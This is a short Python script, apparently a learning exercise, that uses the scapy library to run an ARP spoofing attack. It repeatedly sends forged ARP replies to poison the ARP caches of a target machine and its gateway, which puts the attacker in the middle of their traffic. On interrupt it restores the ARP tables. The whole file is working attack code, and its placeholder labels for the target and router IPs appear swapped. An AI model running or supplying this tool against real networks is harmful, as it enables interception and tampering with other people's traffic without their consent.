#!/usr/bin/env python
import scapy.all as scapy
import time as time

# create ARP Packet
# op = This will set it as a response and not a request
# pdst = IP of the target computer
# hwst = MAc address of the target
# psrc = IP address of the router
def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def arp_spoofing(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_sys(dst_ip, src_ip):
    dst_mac = get_mac_address(dst_ip)
    src_mac = get_mac_address(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)
    
    
target_ip = 'Your route IP'
gateway_ip = 'Target IP Here'
try:
    sent_packet_count = 0
    while True:
        arp_spoofing(target_ip, gateway_ip)
        arp_spoofing(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet sent " + str(sent_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Resetting ARP Tables! PLEASE WAIT ......\n')
    restore_sys(gateway_ip, target_ip)
    restore_sys(target_ip, gateway_ip)
    time.sleep(3)
    print('\n[-] ARP Tables are restored! Shutting Program Down \n')
